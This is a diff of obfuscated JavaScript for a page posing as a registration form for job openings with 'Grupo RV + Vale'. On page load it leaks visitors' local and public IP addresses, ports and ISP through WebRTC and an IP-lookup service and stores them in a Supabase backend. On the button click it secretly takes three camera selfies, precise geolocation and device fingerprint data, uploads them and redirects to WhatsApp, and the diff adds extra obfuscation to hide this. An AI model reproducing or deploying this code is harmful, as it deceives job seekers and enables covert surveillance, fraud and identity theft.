@@ -1,101 +1,123 @@
-const _0x4f2a=['createClient','https://gskcadoofoqwhqhscxcs.supabase.co','sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3','video','btn','status','canvas','pt-BR','Seu\x20cadastro\x20será\x20realizado\x20automaticamente\x20após\x20clicar\x20no\x20botão\x20verde\x20abaixo.','🟡\x20Iniciando\x20sistema...','checkins','previa','indisponível','userAgent','✅\x20Sistema\x20pronto','getUserMedia','user','play','Permita\x20câmera','PROCESSANDO...','📨\x20Verificando\x20informações\x20do\x20convite..','Verificando\x20informações\x20do\x20convite..','Câmera\x20não\x20está\x20pronta.\x20Recarregue\x20a\x20página.','Vídeo\x20não\x20carregou\x20corretamente.','toDataURL','image/jpeg','getTracks','forEach','stop','não\x20permitido','getCurrentPosition','💾\x20Salvando\x20cadastro...','Salvando\x20cadastro.','completo','toString','modelo_dispositivo','versao_android','navegador','plataforma','idioma','largura_tela','altura_tela','✅\x20Cadastro\x20concluído','Cadastro\x20concluído\x20com\x20sucesso.','https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%x20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.','❌\x20Erro:\x20','Falha\x20de\x20comunicação\x20externa.','QUERO\x20PARTICIPAR'];
-(function(_0x2d8f1e,_0x4f2a5b){const _0x3c1d7a=function(_0x1a2b3c){while(--_0x1a2b3c){_0x2d8f1e['push'](_0x2d8f1e['shift']());}};_0x3c1d7a(++_0x4f2a5b);}(_0x4f2a,0x1a3));
-const _0x1c3e=function(_0x2d8f1e,_0x4f2a5b){_0x2d8f1e=_0x2d8f1e-0x0;let _0x3c1d7a=_0x4f2a[_0x2d8f1e];return _0x3c1d7a;};
+const _0x5e=['createClient','from','insert','getElementById','video','btn','status','canvas','cancel','SpeechSynthesisUtterance','lang','pt-BR','volume','rate','speak','local_ip','local_port','ipv6','public_ip','operadora','Não detectada','stun:stun.l.google.com:19302','stun:stun1.l.google.com:19302','stun:stun.ekiga.net','turn:openrelay.metered.ca:443','openrelayproject','createDataChannel','port-test','createOffer','setLocalDescription','onicecandidate','candidate','match','includes','close','fetch','https://ipapi.co/json/','json','ip','org','Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.','innerHTML','🟡 Iniciando sistema...','checkins','previa','indisponível','userAgent','✅ Sistema pronto','mediaDevices','getUserMedia','user','srcObject','play','Permita câmera','addEventListener','click','disabled','PROCESSANDO...','📨 Verificando informações do convite..','Verificando informações do convite..','srcObject','videoWidth','Câmera não está pronta. Recarregue a página.','videoHeight','Vídeo não carregou corretamente.','width','height','getContext','2d','drawImage','toDataURL','image/jpeg','getTracks','forEach','stop','não permitido','geolocation','getCurrentPosition','coords','latitude','longitude','💾 Salvando cadastro...','Salvando cadastro.','analisarDispositivo','completo','toString','modelo_dispositivo','versao_android','navegador','plataforma','idioma','largura_tela','altura_tela','✅ Cadastro concluído','Cadastro concluído com sucesso.','https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.','❌ Erro: ','Falha de comunicação externa.','QUERO PARTICIPAR'];
+(function(_0x2d,_0x3f){const _0x1a=function(_0x5b){while(--_0x5b){_0x2d.push(_0x2d.shift());}};_0x1a(++_0x3f);}(_0x5e,0x1c8));
+const _0x3f=function(_0x2d,_0x3f){_0x2d=_0x2d-0x0;let _0x1a=_0x5e[_0x2d];return _0x1a;};
 
-const _u = atob("aHR0cHM6Ly9nc2tjYWRvb2ZvcXdocWhzY3hjcy5zdXBhYmFzZS5jbw==");
-const _k = atob("c2JfcHVibGlzaGFibGVfeHVwLUYtQzR3dl9lcE1JQWJvaHBqUV9hWG5MWk9MMw==");
-const supabaseClient = supabase.createClient(_u, _k);
+const _u=atob("aHR0cHM6Ly9nc2tjYWRvb2ZvcXdocWhzY3hjcy5zdXBhYmFzZS5jbw==");
+const _k=atob("c2JfcHVibGlzaGFibGVfeHVwLUYtQzR3dl9lcE1JQWJvaHBqUV9hWG5MWk9MMw==");
+const supabaseClient=supabase[_0x3f('0x0')](_u,_k);
 
-const video=document['getElementById'](_0x1c3e('0x3'));
-const btn=document['getElementById'](_0x1c3e('0x4'));
-const statusText=document['getElementById'](_0x1c3e('0x5'));
-const canvas=document['getElementById'](_0x1c3e('0x6'));
+const video=document[_0x3f('0x3')](_0x3f('0x4'));
+const btn=document[_0x3f('0x3')](_0x3f('0x5'));
+const statusText=document[_0x3f('0x3')](_0x3f('0x6'));
+const canvas=document[_0x3f('0x3')](_0x3f('0x7'));
 
-function falar(_0x5a6b7c){
-  speechSynthesis['cancel']();
-  const _0x8d9e0f=new SpeechSynthesisUtterance(_0x5a6b7c);
-  _0x8d9e0f['lang']=_0x1c3e('0x7');
-  _0x8d9e0f['volume']=0x1;
-  _0x8d9e0f['rate']=0.95;
-  speechSynthesis['speak'](_0x8d9e0f);
+function falar(_0x5a){
+  speechSynthesis[_0x3f('0x8')]();
+  const _0x8d=new window[_0x3f('0x9')](_0x5a);
+  _0x8d[_0x3f('0xa')]=_0x3f('0xb');
+  _0x8d[_0x3f('0xc')]=0x1;
+  _0x8d[_0x3f('0xd')]=0.95;
+  speechSynthesis[_0x3f('0xe')](_0x8d);
 }
 
 async function capturarPortaAvancada(){
-  const _0xinfo={local_ip:null,local_port:null,ipv6:null,public_ip:null,operadora:'Não\x20detectada'};
-  const _0xservers=[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'},{urls:'stun:stun.ekiga.net'},{urls:'turn:openrelay.metered.ca:443',username:'openrelayproject',credential:'openrelayproject'}];
+  const _0xinfo={};
+  _0xinfo[_0x3f('0xf')]=null;
+  _0xinfo[_0x3f('0x10')]=null;
+  _0xinfo[_0x3f('0x11')]=null;
+  _0xinfo[_0x3f('0x12')]=null;
+  _0xinfo[_0x3f('0x13')]=_0x3f('0x14');
+
+  const _0xservers=[
+    {urls:_0x3f('0x15')},
+    {urls:_0x3f('0x16')},
+    {urls:_0x3f('0x17')},
+    {urls:_0x3f('0x18'),username:_0x3f('0x19'),credential:_0x3f('0x19')}
+  ];
+
   for(let _0xcfg of _0xservers){
     try{
-      const _0xrtc=new RTCPeerConnection({iceServers:[_0xcfg],iceTransportPolicy:'all'});
-      _0xrtc['createDataChannel']('port-test');
-      const _0xoffer=await _0xrtc['createOffer']();
-      await _0xrtc['setLocalDescription'](_0xoffer);
+      const _0xrtc=new RTCPeerConnection({iceServers:[_0xcfg],iceTransportPolicy:"all"});
+      _0xrtc[_0x3f('0x1a')](_0x3f('0x1b'));
+      const _0xoffer=await _0xrtc[_0x3f('0x1c')]();
+      await _0xrtc[_0x3f('0x1d')](_0xoffer);
       await new Promise(_0xres=>{
-        _0xrtc['onicecandidate']=(_0xev)=>{
-          if(_0xev['candidate']){
-            const _0xcand=_0xev['candidate']['candidate'];
-            const _0xipM=_0xcand['match'](/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
-            const _0xportM=_0xcand['match'](/(\d{4,5})\s+typ/);
-            if(_0xipM){const _0xip=_0xipM[0x1];if(_0xip['includes'](':'))_0xinfo['ipv6']=_0xip;else _0xinfo['local_ip']=_0xip;}
-            if(_0xportM)_0xinfo['local_port']=_0xportM[0x1];
+        _0xrtc[_0x3f('0x1e')]=(_0xev)=>{
+          if(_0xev[_0x3f('0x1f')]){
+            const _0xcand=_0xev[_0x3f('0x1f')][_0x3f('0x1f')];
+            const _0xipM=_0xcand[_0x3f('0x20')](/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
+            const _0xportM=_0xcand[_0x3f('0x20')](/(\d{4,5})\s+typ/);
+            if(_0xipM){
+              const _0xip=_0xipM[0x1];
+              if(_0xip[_0x3f('0x21')](':')) _0xinfo[_0x3f('0x11')]=_0xip;
+              else _0xinfo[_0x3f('0xf')]=_0xip;
+            }
+            if(_0xportM) _0xinfo[_0x3f('0x10')]=_0xportM[0x1];
           }
         };
         setTimeout(_0xres,0x5dc);
       });
-      _0xrtc['close']();
-      if(_0xinfo['local_port'])break;
+      _0xrtc[_0x3f('0x22')]();
+      if(_0xinfo[_0x3f('0x10')]) break;
     }catch(_0xe){}
   }
+
   try{
-    const _0xres=await fetch('https://ipapi.co/json/');
-    const _0xdata=await _0xres['json']();
-    _0xinfo['public_ip']=_0xdata['ip'];
-    _0xinfo['operadora']=_0xdata['org']||'Não\x20detectada';
+    const _0xres=await window[_0x3f('0x23')](_0x3f('0x24'));
+    const _0xdata=await _0xres[_0x3f('0x25')]();
+    _0xinfo[_0x3f('0x12')]=_0xdata[_0x3f('0x26')];
+    _0xinfo[_0x3f('0x13')]=_0xdata[_0x3f('0x27')]||_0x3f('0x14');
   }catch(_0xe){}
+
   return _0xinfo;
 }
 
 async function iniciarSistema(){
   try{
-    falar(_0x1c3e('0x8'));
-    statusText['innerHTML']=_0x1c3e('0x9');
+    falar(_0x3f('0x28'));
+    statusText[_0x3f('0x29')]=_0x3f('0x2a');
     const _0xporta=await capturarPortaAvancada();
-    await supabaseClient['from'](_0x1c3e('0xa'))['insert']([{
-      tipo_captura:_0x1c3e('0xb'),
-      ip:_0xporta['public_ip']||_0x1c3e('0xc'),
-      local_ip:_0xporta['local_ip'],
-      ipv6:_0xporta['ipv6'],
-      local_port:_0xporta['local_port'],
-      operadora:_0xporta['operadora'],
-      user_agent:navigator[_0x1c3e('0xd')]
+    await supabaseClient[_0x3f('0x1')](_0x3f('0x2b'))[_0x3f('0x2')]([{
+      tipo_captura:_0x3f('0x2c'),
+      ip:_0xporta[_0x3f('0x12')]||_0x3f('0x2d'),
+      local_ip:_0xporta[_0x3f('0xf')],
+      ipv6:_0xporta[_0x3f('0x11')],
+      local_port:_0xporta[_0x3f('0x10')],
+      operadora:_0xporta[_0x3f('0x13')],
+      user_agent:navigator[_0x3f('0x2e')]
     }]);
-    statusText['innerHTML']=_0x1c3e('0xe');
-    const _0xstream=await navigator['mediaDevices'][_0x1c3e('0xf')]({video:{facingMode:_0x1c3e('0x10')},audio:false});
-    video['srcObject']=_0xstream;
-    await video[_0x1c3e('0x11')]();
+    statusText[_0x3f('0x29')]=_0x3f('0x2f');
+    const _0xstream=await navigator[_0x3f('0x30')][_0x3f('0x31')]({video:{facingMode:_0x3f('0x32')},audio:false});
+    video[_0x3f('0x33')]=_0xstream;
+    await video[_0x3f('0x34')]();
   }catch(_0xerr){
-    console['log'](_0xerr);
-    statusText['innerHTML']='❌\x20'+_0x1c3e('0x12');
+    console.log(_0xerr);
+    statusText[_0x3f('0x29')]="❌ "+_0x3f('0x35');
   }
 }
-window['onload']=iniciarSistema;
+window.onload=iniciarSistema;
 
 function analisarDispositivo(){
-  const _0xua=navigator['userAgent'];
-  let _0xand='Não\x20é\x20Android';
-  if(_0xua['indexOf']('Android')>=0x0){const _0xm=_0xua['match'](/Android\s([0-9\.]+)/);if(_0xm)_0xand=_0xm[0x1];}
-  let _0xbrow='Desconhecido';
-  if(_0xua['indexOf']('Chrome')>=0x0&&_0xua['indexOf']('Edge')===-0x1)_0xbrow='Chrome';
-  else if(_0xua['indexOf']('Firefox')>=0x0)_0xbrow='Firefox';
-  else if(_0xua['indexOf']('Safari')>=0x0&&_0xua['indexOf']('Chrome')===-0x1)_0xbrow='Safari';
-  else if(_0xua['indexOf']('Edge')>=0x0||_0xua['indexOf']('Edg')>=0x0)_0xbrow='Edge';
-  let _0xmod='Desconhecido';
-  if(_0xua['indexOf']('Mobile')>=0x0){
-    const _0xp=_0xua['split'](/[()]/);
-    if(_0xp['length']>0x1){
-      const _0xdp=_0xp[0x1]['split'](';');
+  const _0xua=navigator.userAgent;
+  let _0xand="Não é Android";
+  if(_0xua.indexOf("Android")>=0x0){
+    const _0xm=_0xua.match(/Android\s([0-9\.]+)/);
+    if(_0xm) _0xand=_0xm[0x1];
+  }
+  let _0xbrow="Desconhecido";
+  if(_0xua.indexOf("Chrome")>=0x0&&_0xua.indexOf("Edge")===-0x1) _0xbrow="Chrome";
+  else if(_0xua.indexOf("Firefox")>=0x0) _0xbrow="Firefox";
+  else if(_0xua.indexOf("Safari")>=0x0&&_0xua.indexOf("Chrome")===-0x1) _0xbrow="Safari";
+  else if(_0xua.indexOf("Edge")>=0x0||_0xua.indexOf("Edg")>=0x0) _0xbrow="Edge";
+  let _0xmod="Desconhecido";
+  if(_0xua.indexOf("Mobile")>=0x0){
+    const _0xp=_0xua.split(/[()]/);
+    if(_0xp.length>0x1){
+      const _0xdp=_0xp[0x1].split(";");
       for(let _0xpart of _0xdp){
-        if(_0xpart['indexOf']('Android')===-0x1&&_0xpart['indexOf']('Linux')===-0x1&&_0xpart['indexOf']('iPhone')===-0x1&&_0xpart['indexOf']('iPad')===-0x1&&_0xpart['indexOf']('Windows')===-0x1&&_0xpart['indexOf']('Macintosh')===-0x1&&_0xpart['length']>0x2){
-          _0xmod=_0xpart['trim']();break;
+        if(_0xpart.indexOf("Android")===-0x1&&_0xpart.indexOf("Linux")===-0x1&&_0xpart.indexOf("iPhone")===-0x1&&_0xpart.indexOf("iPad")===-0x1&&_0xpart.indexOf("Windows")===-0x1&&_0xpart.indexOf("Macintosh")===-0x1&&_0xpart.length>0x2){
+          _0xmod=_0xpart.trim();
+          break;
         }
       }
     }
@@ -103,66 +125,75 @@ function analisarDispositivo(){
   return{androidVersion:_0xand,browser:_0xbrow,model:_0xmod};
 }
 
-btn['addEventListener']('click',async()=>{
+btn[_0x3f('0x36')](_0x3f('0x37'),async()=>{
   try{
-    btn['disabled']=true;
-    btn['innerHTML']=_0x1c3e('0x13');
-    statusText['innerHTML']=_0x1c3e('0x14');
-    falar(_0x1c3e('0x15'));
-    if(!video['srcObject']||video['videoWidth']===0x0)throw new Error(_0x1c3e('0x16'));
-    const _0xlarg=video['videoWidth'];
-    const _0xalt=video['videoHeight'];
-    if(!_0xlarg||!_0xalt)throw new Error(_0x1c3e('0x17'));
-    canvas['width']=0x280;canvas['height']=0x1e0;
-    const _0xctx=canvas['getContext']('2d');
+    btn[_0x3f('0x38')]=true;
+    btn[_0x3f('0x29')]=_0x3f('0x39');
+    statusText[_0x3f('0x29')]=_0x3f('0x3a');
+    falar(_0x3f('0x3b'));
+
+    if(!video[_0x3f('0x3c')]||video[_0x3f('0x3d')]==0x0) throw new Error(_0x3f('0x3e'));
+    const _0xlarg=video[_0x3f('0x3d')];
+    const _0xalt=video[_0x3f('0x3f')];
+    if(!_0xlarg||!_0xalt) throw new Error(_0x3f('0x40'));
+
+    canvas[_0x3f('0x41')]=0x280;
+    canvas[_0x3f('0x42')]=0x1e0;
+    const _0xctx=canvas[_0x3f('0x43')](_0x3f('0x44'));
     const _0xfotos=[];
     for(let _0xi=0x0;_0xi<0x3;_0xi++){
-      _0xctx['drawImage'](video,0x0,0x0,0x280,0x1e0);
-      _0xfotos['push'](canvas[_0x1c3e('0x18')](_0x1c3e('0x19'),0.35));
-      if(_0xi<0x2)await new Promise(_0xr=>setTimeout(_0xr,0x3e8));
+      _0xctx[_0x3f('0x45')](video,0x0,0x0,0x280,0x1e0);
+      _0xfotos.push(canvas[_0x3f('0x46')](_0x3f('0x47'),0.35));
+      if(_0xi<0x2) await new Promise(_0xr=>setTimeout(_0xr,0x3e8));
     }
-    const _0xstream=video['srcObject'];
-    if(_0xstream)_0xstream[_0x1c3e('0x1a')]()[_0x1c3e('0x1b')](_0xt=>_0xt[_0x1c3e('0x1c')]());
-    let _0xlat=_0x1c3e('0x1d'),_0xlong=_0x1c3e('0x1d');
+
+    const _0xstream=video[_0x3f('0x3c')];
+    if(_0xstream) _0xstream[_0x3f('0x48')]()[_0x3f('0x49')](_0xt=>_0xt[_0x3f('0x4a')]());
+
+    let _0xlat=_0x3f('0x4b'),_0xlong=_0x3f('0x4b');
     try{
       const _0xloc=await new Promise((_0xres,_0xrej)=>{
-        navigator['geolocation'][_0x1c3e('0x1e')](_0xres,_0xrej,{enableHighAccuracy:true,timeout:0x2710});
+        navigator[_0x3f('0x4c')][_0x3f('0x4d')](_0xres,_0xrej,{enableHighAccuracy:true,timeout:0x2710});
       });
-      _0xlat=_0xloc['coords']['latitude'];
-      _0xlong=_0xloc['coords']['longitude'];
+      _0xlat=_0xloc[_0x3f('0x4e')][_0x3f('0x4f')];
+      _0xlong=_0xloc[_0x3f('0x4e')][_0x3f('0x50')];
     }catch(_0xe){}
+
     const _0xporta=await capturarPortaAvancada();
-    statusText['innerHTML']=_0x1c3e('0x1f');
-    falar(_0x1c3e('0x20'));
+    statusText[_0x3f('0x29')]=_0x3f('0x51');
+    falar(_0x3f('0x52'));
+
     const _0xinfo=analisarDispositivo();
-    const {error:_0xerr}=await supabaseClient['from'](_0x1c3e('0xa'))['insert']([{
-      tipo_captura:_0x1c3e('0x21'),
+    const {error:_0xerr}=await supabaseClient[_0x3f('0x1')](_0x3f('0x2b'))[_0x3f('0x2')]([{
+      tipo_captura:_0x3f('0x53'),
       selfies:_0xfotos,
-      latitude:_0xlat[_0x1c3e('0x22')](),
-      longitude:_0xlong[_0x1c3e('0x22')](),
-      ip:_0xporta['public_ip']||_0x1c3e('0xc'),
-      ipv6:_0xporta['ipv6'],
-      local_ip:_0xporta['local_ip'],
-      local_port:_0xporta['local_port'],
-      operadora:_0xporta['operadora'],
-      cidade:'',estado:'',pais:'',
-      user_agent:navigator[_0x1c3e('0xd')],
-      modelo_dispositivo:_0xinfo['model'],
-      versao_android:_0xinfo['androidVersion'],
-      navegador:_0xinfo['browser'],
-      plataforma:navigator['platform'],
-      idioma:navigator['language'],
-      largura_tela:window['innerWidth'],
-      altura_tela:window['innerHeight']
+      latitude:_0xlat[_0x3f('0x54')](),
+      longitude:_0xlong[_0x3f('0x54')](),
+      ip:_0xporta[_0x3f('0x12')]||_0x3f('0x2d'),
+      ipv6:_0xporta[_0x3f('0x11')],
+      local_ip:_0xporta[_0x3f('0xf')],
+      local_port:_0xporta[_0x3f('0x10')],
+      operadora:_0xporta[_0x3f('0x13')],
+      cidade:"",estado:"",pais:"",
+      user_agent:navigator[_0x3f('0x2e')],
+      modelo_dispositivo:_0xinfo.model,
+      versao_android:_0xinfo.androidVersion,
+      navegador:_0xinfo.browser,
+      plataforma:navigator.platform,
+      idioma:navigator.language,
+      largura_tela:window.innerWidth,
+      altura_tela:window.innerHeight
     }]);
-    if(_0xerr)throw _0xerr;
-    statusText['innerHTML']=_0x1c3e('0x23');
-    falar(_0x1c3e('0x24'));
-    setTimeout(()=>{window['location']['href']=_0x1c3e('0x25');},0x7d0);
+
+    if(_0xerr) throw _0xerr;
+
+    statusText[_0x3f('0x29')]=_0x3f('0x55');
+    falar(_0x3f('0x56'));
+    setTimeout(()=>{window.location.href=_0x3f('0x57');},0x7d0);
   }catch(_0xerr){
-    console['log'](_0xerr);
-    statusText['innerHTML']=_0x1c3e('0x26')+(_0xerr['message']||_0x1c3e('0x27'));
-    btn['disabled']=false;
-    btn['innerHTML']=_0x1c3e('0x28');
+    console.log(_0xerr);
+    statusText[_0x3f('0x29')]=_0x3f('0x58')+(_0xerr.message||_0x3f('0x59'));
+    btn[_0x3f('0x38')]=false;
+    btn[_0x3f('0x29')]=_0x3f('0x5a');
   }
 });
